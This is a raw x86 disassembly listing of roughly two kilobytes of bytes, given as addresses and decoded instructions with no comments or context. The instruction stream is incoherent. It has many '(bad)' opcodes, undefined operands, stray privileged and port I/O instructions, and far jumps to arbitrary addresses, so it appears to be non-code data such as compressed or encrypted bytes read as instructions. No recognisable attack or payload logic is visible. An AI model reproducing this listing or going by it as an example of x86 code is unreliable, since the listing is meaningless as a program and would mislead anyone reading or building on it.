  42949f:	enter  0x4395,0xbb
  4294a3:	mov    ecx,0x8d63f7ad
  4294a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4294a9:	mov    BYTE PTR cs:[edx+0x3c50fb82],al
  4294b0:	adc    al,0x71
  4294b2:	fcmovnu st,st(2)
  4294b4:	ss ins BYTE PTR es:[edi],dx
  4294b6:	xchg   edx,eax
  4294b7:	ja     0x4294ed
  4294b9:	or     BYTE PTR [ecx+0x5b1340a9],dl
  4294bf:	fist   DWORD PTR [ebx+0x41b09c65]
  4294c5:	test   eax,0xb56e8f0d
  4294ca:	pop    ebx
  4294cb:	pop    ss
  4294cc:	idiv   DWORD PTR [eax-0x17]
  4294cf:	imul   esp,DWORD PTR ds:0xf945e511,0xffffffa8
  4294d6:	mov    edx,esp
  4294d8:	(bad)  
  4294d9:	das    
  4294da:	mov    bl,0x2e
  4294dc:	push   edi
  4294dd:	imul   ecx,DWORD PTR [ebp-0x76a4520e],0xffffff94
  4294e4:	or     edi,DWORD PTR [edx+0x69]
  4294e7:	aaa    
  4294e8:	push   ebx
  4294e9:	add    BYTE PTR [ebx+0x43],dl
  4294ec:	jno    0x429549
  4294ee:	push   ss
  4294ef:	mov    dh,0xf5
  4294f1:	cli    
  4294f2:	test   DWORD PTR [edx],edx
  4294f4:	mov    ebx,0x2c3a9a6e
  4294f9:	sub    al,0xd1
  4294fb:	push   eax
  4294fc:	test   BYTE PTR [ebp-0x15b0b6f6],al
  429502:	mov    ch,al
  429504:	mov    dh,0x6d
  429506:	push   ecx
  429507:	fidiv  WORD PTR [eax+0x4e5c2933]
  42950d:	inc    eax
  42950e:	fstp   QWORD PTR [eax-0x18]
  429511:	lock or BYTE PTR [ecx-0xf],cl
  429515:	adc    ch,BYTE PTR [edx]
  429517:	xor    ebp,DWORD PTR [ebp+0x1e762a06]
  42951d:	mov    ah,0x4c
  42951f:	int    0xc2
  429521:	popf   
  429522:	xor    eax,0x46b76d41
  429527:	mov    WORD PTR [ebp+0x412fe0a7],?
  42952d:	pop    esp
  42952e:	pop    ebp
  42952f:	adc    eax,0xaf25705c
  429534:	es pop ebx
  429536:	pop    ss
  429537:	std    
  429538:	mov    BYTE PTR [edx],bh
  42953a:	and    ch,BYTE PTR [esi-0x35]
  42953d:	gs in  eax,0xa3
  429540:	mov    cl,0xd2
  429542:	or     BYTE PTR cs:[esi],dl
  429545:	fdiv   DWORD PTR [eax]
  429547:	add    eax,0xa3c2f0a2
  42954c:	test   DWORD PTR [ebp-0x77f7e52e],ebp
  429552:	aam    0x40
  429554:	aas    
  429555:	out    dx,al
  429556:	imul   eax,DWORD PTR [eax],0x58
  429559:	jle    0x429529
  42955b:	pop    ebp
  42955c:	add    BYTE PTR ds:0xbf5538d7,bl
  429562:	inc    esp
  429563:	xchg   DWORD PTR [esi],esi
  429565:	push   ebp
  429566:	jno    0x4295e0
  429568:	out    0x28,eax
  42956a:	xor    al,0xd0
  42956c:	mov    bl,0xb
  42956e:	dec    ebx
  42956f:	sbb    eax,DWORD PTR [eax+ebx*4-0x24]
  429573:	pop    esp
  429574:	popa   
  429575:	push   0x6e
  429577:	mov    bl,al
  429579:	mov    dh,0x6e
  42957b:	push   cs
  42957c:	mov    ecx,0xef4b8ee0
  429581:	test   edx,ebx
  429583:	add    eax,0xf1696adc
  429588:	xchg   esp,eax
  429589:	popf   
  42958a:	sbb    al,BYTE PTR [eax]
  42958c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42958e:	sbb    eax,0x85a86d04
  429593:	shr    bl,0x29
  429596:	fnsave [ebp+0x345b4b0b]
  42959c:	add    eax,DWORD PTR [edx]
  42959e:	shl    BYTE PTR [ebp+0x2547dba6],1
  4295a4:	mov    ds:0x55c2ba2b,al
  4295a9:	mov    ebx,esp
  4295ab:	sahf   
  4295ac:	mov    ecx,0x851b012b
  4295b1:	addr16 xchg ecx,eax
  4295b3:	inc    edx
  4295b4:	pop    ecx
  4295b5:	jg     0x4295d7
  4295b7:	inc    esp
  4295b8:	dec    ebx
  4295b9:	shl    BYTE PTR [edi+0x11],0xe4
  4295bd:	jecxz  0x429636
  4295bf:	mov    cs:0x35bad6e,eax
  4295c5:	and    eax,0x12e8fe27
  4295ca:	fnstcw WORD PTR [edx+0x71]
  4295cd:	fsubr  DWORD PTR cs:[eax-0x65]
  4295d1:	or     BYTE PTR [esi-0x12],0xd9
  4295d5:	and    esp,0x63
  4295d8:	mov    al,0x50
  4295da:	mov    al,ds:0x42172d8
  4295df:	adc    cl,ah
  4295e1:	inc    esi
  4295e2:	jnp    0x429564
  4295e4:	mov    eax,0x7e4be9a6
  4295e9:	push   eax
  4295ea:	push   ebx
  4295eb:	dec    eax
  4295ec:	mov    al,ds:0xcddb88ed
  4295f1:	add    ch,BYTE PTR ds:0x73ed23e2
  4295f7:	push   esi
  4295f8:	scas   al,BYTE PTR es:[edi]
  4295f9:	push   0xceab285b
  4295fe:	push   ebx
  4295ff:	and    al,0xc1
  429601:	mov    dh,0x1
  429603:	cs inc ebp
  429605:	xchg   BYTE PTR [esi+esi*2],ah
  429608:	xchg   esp,eax
  429609:	cwde   
  42960a:	call   0x8514de9
  42960f:	mov    edx,0xc05521e3
  429614:	out    0x18,al
  429616:	loopne 0x4295cc
  429618:	or     ebx,DWORD PTR [ebp+0x14]
  42961b:	jl     0x429624
  42961d:	rol    DWORD PTR [edi+esi*8],cl
  429620:	add    dh,BYTE PTR [esi-0x6691ebab]
  429626:	sub    eax,ebx
  429628:	hlt    
  429629:	and    DWORD PTR [ecx],ebx
  42962b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42962c:	push   edx
  42962d:	pop    ss
  42962e:	aad    0xc2
  429630:	stos   DWORD PTR es:[edi],eax
  429631:	idiv   DWORD PTR [ebx-0x79eb544d]
  429637:	mov    ds:0x6319d456,eax
  42963c:	icebp  
  42963d:	js     0x4296aa
  42963f:	fwait
  429640:	push   0x6ac476e1
  429645:	in     al,0x93
  429647:	pop    esi
  429648:	sbb    eax,0x6db6085c
  42964d:	mov    ds:0xe23f5670,eax
  429652:	xchg   DWORD PTR [eax-0x7d],ebx
  429655:	inc    eax
  429656:	push   esi
  429657:	fs mov eax,0xac80d04a
  42965d:	pop    esp
  42965e:	or     eax,0x6db0b6db
  429663:	sbb    BYTE PTR [ebx-0x77],al
  429666:	cmp    edx,DWORD PTR [eax+esi*1+0x5d595823]
  42966d:	sbb    eax,0x18a829b4
  429672:	lahf   
  429673:	icebp  
  429674:	sub    al,0xd
  429676:	push   edx
  429677:	mov    ebx,0x5f6d2c6d
  42967c:	mov    bl,0x1a
  42967e:	mov    ch,0xfc
  429680:	pop    ds
  429681:	cmp    ecx,ebp
  429683:	mov    ch,0xfe
  429685:	arpl   WORD PTR [ebx-0xc40a44b],di
  42968b:	dec    ecx
  42968c:	inc    ecx
  42968d:	sti    
  42968e:	call   0x7eaacbce
  429693:	je     0x429700
  429695:	adc    eax,0x6f41e05b
  42969a:	out    dx,eax
  42969b:	pop    edi
  42969c:	mov    ch,BYTE PTR [eax+0x2b0b4a9]
  4296a2:	or     al,0x4
  4296a4:	jge    0x429714
  4296a6:	dec    edx
  4296a7:	ja     0x42971f
  4296a9:	inc    eax
  4296aa:	mov    ah,0x83
  4296ac:	cmp    esp,esi
  4296ae:	out    0x48,al
  4296b0:	ror    BYTE PTR [esp+ebp*2+0x20],cl
  4296b4:	(bad)  
  4296b5:	fld    TBYTE PTR [ecx]
  4296b7:	pusha  
  4296b8:	push   cs
  4296b9:	inc    esi
  4296ba:	lds    edx,FWORD PTR [eax]
  4296bc:	pop    edx
  4296bd:	jbe    0x429700
  4296bf:	mov    cl,0x2c
  4296c1:	scas   eax,DWORD PTR es:[edi]
  4296c2:	jmp    0x42964a
  4296c4:	pop    ebp
  4296c5:	xchg   edx,eax
  4296c6:	jge    0x4296cb
  4296c8:	push   ecx
  4296c9:	cmp    ebp,DWORD PTR [edx+0x3aa226bd]
  4296cf:	stos   BYTE PTR es:[edi],al
  4296d0:	pusha  
  4296d1:	jecxz  0x429729
  4296d3:	cs int 0xcc
  4296d6:	xchg   edi,eax
  4296d7:	or     DWORD PTR [ecx-0x12497fcb],ecx
  4296dd:	pop    ecx
  4296de:	into   
  4296df:	or     DWORD PTR [edi+0x765c1114],esp
  4296e5:	mov    eax,ds:0xf2fbb151
  4296ea:	adc    DWORD PTR [eax],0xfffffff9
  4296ed:	xchg   ebx,eax
  4296ee:	(bad)  
  4296ef:	pop    ebx
  4296f0:	popa   
  4296f1:	push   ebx
  4296f2:	aad    0x22
  4296f4:	jno    0x429757
  4296f6:	retf   0x9801
  4296f9:	pop    esp
  4296fa:	mov    ch,0x23
  4296fc:	mov    edx,0x7d083eb5
  429701:	(bad)  
  429702:	pop    ss
  429703:	sub    eax,0x16d4cff6
  429708:	inc    eax
  429709:	push   edi
  42970a:	inc    edi
  42970b:	and    DWORD PTR [edi],esi
  42970d:	dec    eax
  42970e:	mov    ch,BYTE PTR [esi]
  429710:	sub    eax,0x31b20a34
  429715:	adc    edx,DWORD PTR [edi]
  429717:	iret   
  429718:	dec    eax
  429719:	add    al,0x17
  42971b:	mov    dh,0xa6
  42971d:	mov    WORD PTR [ecx-0x32],?
  429720:	mov    edi,0x1b373e28
  429725:	inc    ebp
  429726:	pop    ebx
  429727:	push   ebx
  429728:	lods   eax,DWORD PTR ds:[esi]
  429729:	out    dx,eax
  42972a:	add    cl,BYTE PTR [ebx]
  42972c:	push   0x74
  42972e:	sbb    BYTE PTR ds:0xa0d16c04,0xcf
  429735:	nop
  429736:	jl     0x429765
  429738:	push   0xffffffa3
  42973a:	add    DWORD PTR [edx+0x4d],ecx
  42973d:	out    0x83,eax
  42973f:	sub    dl,BYTE PTR ds:0x66b628bb
  429745:	push   eax
  429746:	int    0x25
  429748:	or     cl,ah
  42974a:	fcmovnbe st,st(2)
  42974c:	inc    esi
  42974d:	inc    ebx
  42974e:	or     al,0xa
  429750:	lea    eax,[eax+0x50836c4d]
  429756:	(bad)  
  429757:	(bad)  
  429758:	add    cl,BYTE PTR [ebx+0x23]
  42975b:	aam    0xc
  42975d:	sub    BYTE PTR [ebp+0x66],ch
  429760:	mov    dh,0xb4
  429762:	push   ecx
  429763:	mov    eax,0x1081d14c
  429768:	mov    cl,0x9e
  42976a:	mov    eax,ds:0x6d1bbf79
  42976f:	imul   esp,ebx,0x721b80cd
  429775:	or     edx,DWORD PTR [edx+0x23]
  429778:	pop    edx
  429779:	aas    
  42977a:	mov    bh,0x26
  42977c:	add    ch,BYTE PTR [esi-0x71]
  42977f:	retf   0x2b5
  429782:	add    dh,BYTE PTR [esi+edx*1+0x15]
  429786:	ret    0xdb76
  429789:	or     dl,BYTE PTR [edi+ebp*1-0x15de4608]
  429790:	jp     0x429749
  429792:	adc    al,al
  429794:	test   edx,esp
  429796:	shl    DWORD PTR [ebx-0x3c],1
  429799:	rcr    BYTE PTR [ecx+0x52f96d82],cl
  42979f:	push   ebx
  4297a0:	std    
  4297a1:	lea    eax,[ecx+0x2]
  4297a4:	cld    
  4297a5:	add    BYTE PTR [eax-0x4f],ch
  4297a8:	enter  0x58,0xb6
  4297ac:	fcmove st,st(6)
  4297ae:	shl    BYTE PTR [ebx],cl
  4297b0:	and    dh,BYTE PTR [ebx+0x42]
  4297b3:	js     0x4297a2
  4297b5:	sub    BYTE PTR [eax-0x24316f2c],bh
  4297bb:	push   esp
  4297bc:	pop    ebp
  4297bd:	push   eax
  4297be:	popa   
  4297bf:	shl    BYTE PTR [esi],1
  4297c1:	add    BYTE PTR [esp+edx*1+0x3208ca2],dh
  4297c8:	cmc    
  4297c9:	ins    BYTE PTR es:[edi],dx
  4297ca:	or     ah,al
  4297cc:	mov    dl,0x7
  4297ce:	push   ecx
  4297cf:	mov    dh,0x2
  4297d1:	pop    edx
  4297d2:	cmp    eax,DWORD PTR [edx-0x67]
  4297d5:	xor    BYTE PTR [esp+edx*1],dh
  4297d8:	fdivr  QWORD PTR [ebx+0x40]
  4297db:	push   ss
  4297dc:	loop   0x4297a0
  4297de:	(bad)  
  4297df:	mov    dh,0x17
  4297e1:	test   eax,0x866330b0
  4297e6:	jbe    0x4297c4
  4297e8:	aaa    
  4297e9:	fiadd  DWORD PTR [ecx-0x14]
  4297ec:	sub    BYTE PTR [eax+edi*1+0x18],ch
  4297f0:	sub    eax,0xa5a575f5
  4297f5:	lods   eax,DWORD PTR ds:[esi]
  4297f6:	mov    ebx,DWORD PTR [ebp-0x10]
  4297f9:	stos   BYTE PTR es:[edi],al
  4297fa:	xchg   ecx,eax
  4297fb:	pop    ecx
  4297fc:	sti    
  4297fd:	adc    al,0x46
  4297ff:	mov    eax,ds:0xe3bcb6d4
  429804:	inc    edi
  429805:	adc    DWORD PTR [eax+0x79],edi
  429808:	push   esp
  429809:	xor    al,0x14
  42980b:	hlt    
  42980c:	jmp    0x6e57131d
  429811:	call   0x6e87:0x85c0cb89
  429818:	jmp    FWORD PTR [edx-0xe15b22f]
  42981e:	dec    esp
  42981f:	fidivr DWORD PTR [edx+0x395d6ed4]
  429825:	lods   eax,DWORD PTR ds:[esi]
  429826:	mov    ecx,0xbc2332d8
  42982b:	cmp    al,0x2d
  42982d:	sbb    eax,0xef803b14
  429832:	sub    esi,DWORD PTR [ecx-0x31]
  429835:	jbe    0x42985a
  429837:	mov    al,ds:0xc5b1a02e
  42983c:	push   es
  42983d:	stc    
  42983e:	pop    edx
  42983f:	call   0x1086f8c4
  429844:	out    0xbe,al
  429846:	push   esi
  429847:	je     0x429849
  429849:	mov    ch,0x5d
  42984b:	imul   edi,edi,0xffffffe9
  42984e:	gs ret 
  429850:	mov    dh,0x50
  429852:	sub    bl,al
  429854:	outs   dx,BYTE PTR ds:[esi]
  429855:	sub    al,0xa
  429857:	pop    esi
  429858:	cdq    
  429859:	adc    eax,0xdbc2d7b9
  42985e:	push   edx
  42985f:	and    eax,ebp
  429861:	push   edx
  429862:	in     al,dx
  429863:	stos   BYTE PTR es:[edi],al
  429864:	imul   edi,DWORD PTR [esi],0x65
  429867:	imul   esi,DWORD PTR [ebp+ebx*2+0xde55468],0x3d11e4a8
  429872:	xor    eax,0xb440740a
  429877:	stc    
  429878:	cmp    al,0x83
  42987a:	ins    DWORD PTR es:[edi],dx
  42987b:	add    edx,eax
  42987d:	lods   eax,DWORD PTR ds:[esi]
  42987e:	fwait
  42987f:	inc    ecx
  429880:	mov    esi,0x577cb6ee
  429885:	outs   dx,BYTE PTR ds:[esi]
  429886:	test   DWORD PTR [esi],ecx
  429888:	mov    al,ds:0x1677654b
  42988d:	sar    DWORD PTR [ebp+0x3d],cl
  429890:	or     eax,0xe2b76d01
  429895:	jecxz  0x429860
  429897:	int3   
  429898:	sti    
  429899:	fldz   
  42989b:	repz and DWORD PTR [eax-0x171a75fa],ecx
  4298a2:	sbb    dl,BYTE PTR [ebx-0x1c9e8eef]
  4298a8:	sbb    al,0xc0
  4298aa:	(bad)  
  4298ab:	ins    DWORD PTR es:[edi],dx
  4298ac:	dec    edx
  4298ad:	nop
  4298ae:	in     eax,dx
  4298af:	ret    0xd6d2
  4298b2:	and    eax,0x20730588
  4298b7:	xor    DWORD PTR [ecx+edi*1-0x29],esp
  4298bb:	fst    QWORD PTR [edi]
  4298bd:	ss call 0x3660:0x9adec2aa
  4298c5:	jg     0x42992e
  4298c7:	loope  0x429936
  4298c9:	popa   
  4298ca:	fist   DWORD PTR ds:0x170ca796
  4298d0:	pop    ds
  4298d1:	in     eax,0x21
  4298d3:	push   esi
  4298d4:	jge    0x4298b0
  4298d6:	outs   dx,BYTE PTR ds:[esi]
  4298d7:	ins    BYTE PTR es:[edi],dx
  4298d8:	mov    ecx,0xb0c11e72
  4298dd:	cmp    esi,DWORD PTR [ebp+0x1a]
  4298e0:	or     al,0x8a
  4298e2:	jne    0x429928
  4298e4:	mov    bh,0xb2
  4298e6:	jecxz  0x4298f4
  4298e8:	xchg   edx,eax
  4298e9:	outs   dx,DWORD PTR ds:[esi]
  4298ea:	sub    ebx,DWORD PTR [ebx]
  4298ec:	push   edx
  4298ed:	sub    eax,DWORD PTR [eax+0x7cecbb6d]
  4298f3:	loopne 0x429878
  4298f5:	push   ebx
  4298f6:	pop    edi
  4298f7:	(bad)  
  4298f8:	jecxz  0x4298b5
  4298fa:	mov    al,ds:0x3778aa25
  4298ff:	mov    al,ds:0x51a7d4f8
  429904:	fstp   QWORD PTR [eax+0x6a]
  429907:	dec    edx
  429908:	mov    ecx,0xa685c9b8
  42990d:	push   edx
  42990e:	mov    ebx,0x5a03346d
  429913:	imul   BYTE PTR [eax+0x77]
  429916:	mov    esp,0xd6d4dac8
  42991b:	dec    edx
  42991c:	aad    0xd2
  42991e:	popa   
  42991f:	sbb    eax,0x6a38cceb
  429924:	inc    ebp
  429925:	mov    ah,0x81
  429927:	or     BYTE PTR [edx],0x53
  42992a:	fsubr  DWORD PTR [eax-0x332705a3]
  429930:	je     0x4298f4
  429932:	adc    al,BYTE PTR [edi+0x207f900b]
  429938:	push   0xe10962a2
  42993d:	sar    DWORD PTR [ebx],1
  42993f:	cwde   
  429940:	sub    dl,bl
  429942:	pop    edx
  429943:	pop    eax
  429944:	(bad)  
  429946:	shl    ecx,cl
  429948:	call   0xb8e4d387
  42994d:	push   eax
  42994e:	mov    eax,ds:0xe851fe97
  429953:	inc    ebx
  429954:	sub    dh,BYTE PTR [esi]
  429956:	adc    BYTE PTR [edi],dh
  429958:	push   edi
  429959:	shl    BYTE PTR [edx],0xe2
  42995c:	pop    edi
  42995d:	scas   eax,DWORD PTR es:[edi]
  42995e:	or     bl,dl
  429960:	sub    dl,0x63
  429963:	jbe    0x429987
  429965:	(bad)  
  429966:	adc    eax,0x67ed11d5
  42996b:	fcom   DWORD PTR [eax+0x75]
  42996e:	or     BYTE PTR fs:0xd203a368,0x20
  429976:	inc    eax
  429977:	rcl    BYTE PTR [esi-0x42],cl
  42997a:	mov    ah,0x3
  42997c:	addr16 mov ecx,0xb54d95
  429982:	mov    ch,0x7c
  429984:	(bad)  [ecx+0xed2e009]
  42998a:	xor    dl,BYTE PTR [edi-0x11]
  42998d:	mov    bl,0x2c
  42998f:	mov    WORD PTR [edx+0x26740076],es
  429995:	mov    cl,BYTE PTR [eax+0x5746561a]
  42999b:	rol    DWORD PTR [esi-0x6297426e],0x37
  4299a2:	daa    
  4299a3:	mov    ds:0xdaed897c,al
  4299a8:	iret   
  4299a9:	jp     0x429a21
  4299ab:	mov    ds:0x4a850054,eax
  4299b0:	add    BYTE PTR [ebp+0x1b],ch
  4299b3:	lea    ecx,[ebp-0x1]
  4299b6:	dec    esp
  4299b7:	xchg   edx,eax
  4299b8:	mov    ds:0x4b7dba,ax
  4299be:	test   al,0xd1
  4299c0:	aad    0x11
  4299c2:	xchg   DWORD PTR [ecx-0x6c],edi
  4299c5:	mov    al,0xb0
  4299c7:	popa   
  4299c8:	stos   BYTE PTR es:[edi],al
  4299c9:	sub    al,0xc3
  4299cb:	test   BYTE PTR [ecx+0x1],cl
  4299ce:	cmp    DWORD PTR [esi-0x4a4f4ed3],esi
  4299d4:	jg     0x429a40
  4299d6:	and    esp,esi
  4299d8:	push   0x44
  4299da:	mov    edx,edi
  4299dc:	mov    ds:0x64e36d4b,al
  4299e1:	cmc    
  4299e2:	lahf   
  4299e3:	pop    es
  4299e4:	jno    0x4299de
  4299e6:	jnp    0x42997b
  4299e8:	or     eax,0x7803b41e
  4299ed:	or     dl,BYTE PTR [eax+0x50d6835e]
  4299f3:	fnsave [esi-0x406daf82]
  4299f9:	add    al,0x57
  4299fb:	mov    ecx,0xea5cbc94
  429a00:	sub    ah,al
  429a02:	das    
  429a03:	push   0xffffff93
  429a05:	xchg   ebx,eax
  429a06:	dec    edx
  429a07:	aam    0x61
  429a09:	pop    eax
  429a0a:	jle    0x4299b5
  429a0c:	mov    cl,0xaa
  429a0e:	adc    eax,0x15e1fb
  429a13:	out    dx,al
  429a14:	pop    es
  429a15:	cdq    
  429a16:	(bad)  
  429a17:	repnz lods eax,DWORD PTR ds:[esi]
  429a19:	and    DWORD PTR [ebx+0x2fb61736],ebx
  429a1f:	add    BYTE PTR [ecx],al
  429a21:	dec    ebp
  429a22:	pusha  
  429a23:	inc    ebx
  429a24:	adc    al,0x1b
  429a26:	pop    edx
  429a27:	xchg   edx,eax
  429a28:	mov    dh,0x3
  429a2a:	cli    
  429a2b:	pop    ebp
  429a2c:	fsubr  DWORD PTR [eax+0x1c42b703]
  429a32:	cmp    dl,0x2
  429a35:	and    BYTE PTR [ebp+0x5fb40136],dh
  429a3b:	repz dec ebx
  429a3d:	jge    0x429a67
  429a3f:	mov    esi,0xb8a89a16
  429a44:	out    dx,eax
  429a45:	push   ss
  429a46:	ret    0x525c
  429a49:	hlt    
  429a4a:	or     eax,0xa346e083
  429a4f:	daa    
  429a50:	stos   DWORD PTR es:[edi],eax
  429a51:	dec    ebx
  429a52:	mov    eax,ds:0xadb68225
  429a57:	mov    dh,0x4
  429a59:	cwde   
  429a5a:	and    BYTE PTR [edi],dh
  429a5c:	sub    dl,bl
  429a5e:	pop    es
  429a5f:	imul   edi,DWORD PTR [ebx],0x22
  429a62:	fisubr DWORD PTR [edx+0x6702cbde]
  429a68:	cwde   
  429a69:	sahf   
  429a6a:	inc    eax
  429a6b:	shl    BYTE PTR [esi+0x61],0x40
  429a6f:	adc    esp,DWORD PTR [eax-0x3d5552d4]
  429a75:	inc    edx
  429a76:	mov    ebx,0xfd90fad5
  429a7b:	ds stos DWORD PTR es:[edi],eax
  429a7d:	mov    esp,0xb1686e8
  429a82:	ins    BYTE PTR es:[edi],dx
  429a83:	mov    ah,0xdb
  429a85:	cmp    BYTE PTR [edi-0x70],dh
  429a88:	call   0xa2fa:0xc074d5a4
  429a8f:	cs adc al,0x6e
  429a92:	cmp    BYTE PTR ds:0x8a28fab2,dh
  429a98:	jmp    0x44ed:0x86b6db63
  429a9f:	jp     0x429a87
  429aa1:	sbb    eax,0xb75eb0ec
  429aa6:	adc    esp,edx
  429aa8:	lea    ebp,[ebp-0x40]
  429aab:	jmp    0x9e59c20a
  429ab0:	imul   ebx,DWORD PTR [ebx-0x40],0xffffffd6
  429ab4:	adc    esp,DWORD PTR [ecx+0x62]
  429ab7:	ja     0x429b0a
  429ab9:	sar    DWORD PTR [edi+0x54d80a80],0x71
  429ac0:	xchg   edx,eax
  429ac1:	sbb    ah,BYTE PTR [edi-0x13]
  429ac4:	icebp  
  429ac5:	loopne 0x429ad9
  429ac7:	es cmp bl,ch
  429aca:	call   0x3dc6bfe2
  429acf:	ins    DWORD PTR es:[edi],dx
  429ad0:	in     eax,0x42
  429ad2:	pop    ecx
  429ad3:	daa    
  429ad4:	rcr    bh,1
  429ad6:	mov    ah,0x85
  429ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ad9:	pusha  
  429ada:	fsub   st(2),st
  429adc:	test   al,0x2e
  429ade:	cwde   
  429adf:	pushf  
  429ae0:	(bad)  
  429ae1:	jns    0x429aec
  429ae3:	inc    esi
  429ae4:	sti    
  429ae5:	aas    
  429ae6:	ins    DWORD PTR es:[edi],dx
  429ae7:	xchg   ebp,eax
  429ae8:	jbe    0x429b2b
  429aea:	pushfw 
  429aec:	jecxz  0x429b35
  429aee:	sub    edx,edi
  429af0:	mov    ch,0xed
  429af2:	mov    dh,0x2d
  429af4:	je     0x429ac8
  429af6:	fistp  WORD PTR [edi+0x35]
  429afa:	mov    al,0xcb
  429afc:	out    dx,eax
  429afd:	es sub eax,0x20b6edb5
  429b03:	mov    sp,0x5a6d
  429b07:	pop    ecx
  429b08:	rol    DWORD PTR [esi+ecx*8+0x20],1
  429b0c:	mov    ch,0x5b
  429b0e:	imul   edi,DWORD PTR [ebx+0x7ac36947],0xfffffff9
  429b15:	adc    edx,esp
  429b17:	sub    DWORD PTR [ecx+0x74],ecx
  429b1a:	mov    BYTE PTR [ebp-0x17],ah
  429b1d:	mov    dh,0xbc
  429b1f:	cmp    ah,BYTE PTR [ebx]
  429b21:	ret    0x92af
  429b24:	(bad)  
  429b25:	jne    0x429abb
  429b27:	mov    BYTE PTR [edx+0x62eeac1a],bl
  429b2d:	adc    eax,0xcb16857c
  429b32:	pop    ebx
  429b33:	sbb    BYTE PTR [ebx+0x0],dh
  429b36:	sbb    al,0x6b
  429b38:	lea    esi,[esi]
  429b3a:	dec    ebp
  429b3b:	add    al,0xdd
  429b3d:	pop    edx
  429b3e:	sbb    al,0x2c
  429b40:	sbb    al,0xce
  429b42:	les    esi,FWORD PTR [esi-0x53]
  429b45:	mov    dh,0xa9
  429b47:	mov    al,BYTE PTR [eax-0x3c]
  429b4a:	inc    eax
  429b4b:	jo     0x429b3c
  429b4d:	jl     0x429b10
  429b4f:	push   esi
  429b50:	shl    BYTE PTR [eax+0x59b288e],1
  429b56:	loope  0x429ad8
  429b58:	fadd   DWORD PTR [ecx-0x2c]
  429b5b:	arpl   WORD PTR [ebp+0x77],bp
  429b5e:	sbb    BYTE PTR [edx+0x44],0xad
  429b62:	es ja  0x429b2b
  429b65:	(bad)  
  429b66:	sub    BYTE PTR cs:[esi],dh
  429b69:	in     eax,0x36
  429b6b:	xor    cl,bh
  429b6d:	gs jo  0x429b6f
  429b70:	inc    edx
  429b71:	and    esi,DWORD PTR [esi+0x58716fa4]
  429b77:	and    BYTE PTR [edi],al
  429b79:	add    BYTE PTR [ebp+0x25],bl
  429b7c:	add    cl,bl
  429b7e:	ret    0x880e
  429b81:	fidivr DWORD PTR cs:[edi]
  429b84:	push   ds
  429b85:	xor    eax,0x52d53a8b
  429b8a:	stc    
  429b8b:	(bad)  
  429b8c:	dec    esi
  429b8d:	outs   dx,DWORD PTR ds:[esi]
  429b8e:	xor    al,0x0
  429b90:	repz ror BYTE PTR [edx-0x69],0xf
  429b95:	ss inc ebp
  429b97:	sub    al,0x8c
  429b99:	sub    al,0x57
  429b9b:	loop   0x429ba6
  429b9d:	pop    ss
  429b9e:	push   esi
  429b9f:	aam    0x10
  429ba1:	shl    DWORD PTR [eax+0x3d],0xc4
  429ba5:	inc    edi
  429ba6:	rcr    DWORD PTR [eax-0x22],cl
  429ba9:	jmp    0x52a0:0x44a144da
  429bb0:	repz add BYTE PTR [esi+edi*2],ah
  429bb4:	fist   DWORD PTR [edx]
  429bb6:	push   eax
  429bb7:	add    esi,DWORD PTR [ecx+0x4e]
  429bba:	rcl    esp,cl
  429bbc:	fbstp  TBYTE PTR [ebp-0x44be2a4c]
  429bc2:	(bad)
  429bc5:	add    DWORD PTR [ebx+0x0],0x25
  429bc9:	mov    ds:0xda988e00,al
  429bce:	mov    dh,0x82
  429bd0:	mov    dh,0x55
  429bd2:	push   ss
  429bd3:	inc    esp
  429bd4:	mov    edi,0xab3dc22d
  429bd9:	mov    cl,0x2d
  429bdb:	pop    edi
  429bdc:	out    dx,eax
  429bdd:	imul   eax,DWORD PTR [eax],0x90115556
  429be3:	out    0x90,eax
  429be5:	scas   eax,DWORD PTR es:[edi]
  429be6:	fisubr DWORD PTR [edx]
  429be8:	mov    dh,0x76
  429bea:	mov    ch,0x56
  429bec:	mov    edi,0x46fcd1d4
  429bf1:	call   0xdad6:0x655b5b80
  429bf8:	mov    al,0xb5
  429bfa:	fistp  DWORD PTR [eax*1+0x1696db74]
  429c01:	(bad)  
  429c02:	sti    
  429c03:	mov    ecx,0xda678c91
  429c08:	pop    ss
  429c09:	lea    ebx,ds:0x4aa25c05
  429c0f:	push   edx
  429c10:	(bad)  
  429c11:	xchg   ecx,eax
  429c12:	xchg   cl,bl
  429c14:	jecxz  0x429bec
  429c16:	outs   dx,BYTE PTR ds:[esi]
  429c17:	mov    ch,0xe8
  429c19:	jno    0x429c03
  429c1b:	add    ch,0xe0
  429c1e:	push   cs
  429c1f:	xor    BYTE PTR [ebp-0x3d],ah
  429c22:	jo     0x429c25
  429c24:	jne    0x429c9f
  429c26:	sub    BYTE PTR [eax],al
  429c28:	inc    esi
  429c29:	(bad)  
  429c2a:	xchg   edi,eax
  429c2b:	pop    edx
  429c2c:	outs   dx,BYTE PTR ds:[esi]
  429c2d:	ins    BYTE PTR es:[edi],dx
  429c2e:	sbb    eax,0x1b989851
  429c33:	out    dx,eax
  429c34:	adc    ebx,DWORD PTR [edi-0x48977ab0]
  429c3a:	mov    dh,0x21
  429c3c:	mov    bh,0xb6
  429c3e:	add    ebx,DWORD PTR [eax+0x47824c0e]
  429c44:	mov    ah,0x4d
  429c46:	add    esp,ebx
  429c48:	lea    edx,[esi-0x7be40c10]
  429c4e:	cmp    BYTE PTR [edx-0x45],ah
  429c51:	sub    eax,0x10617c2c
  429c56:	add    DWORD PTR [esi+0x20],ebp
  429c59:	push   cs
  429c5a:	sbb    dh,al
  429c5c:	outs   dx,BYTE PTR ds:[esi]
  429c5d:	pop    ebp
  429c5e:	mov    ah,0x81
  429c60:	jae    0x429c68
  429c62:	xchg   esp,eax
  429c63:	inc    esp
  429c64:	jne    0x429cd4
  429c66:	xor    eax,0xbb6a2362
  429c6b:	ror    BYTE PTR [ebx],1
  429c6d:	and    eax,0xcddd57e3
  429c72:	jecxz  0x429c4a
  429c74:	push   esp
  429c75:	mov    bh,0xb6
  429c77:	ins    DWORD PTR es:[edi],dx
  429c78:	test   BYTE PTR [eax],0xe9
  429c7b:	fdiv   QWORD PTR [esi-0x3f1c46a7]
  429c81:	xchg   DWORD PTR [esi-0x776ad325],esi
  429c87:	cmc    
  429c88:	je     0x429cda
  429c8a:	stos   BYTE PTR es:[edi],al
  429c8b:	pop    ss
  429c8c:	jo     0x429cd0
  429c8e:	imul   ebx,ebx,0x1e9d2c44
  429c94:	mov    bl,0x2
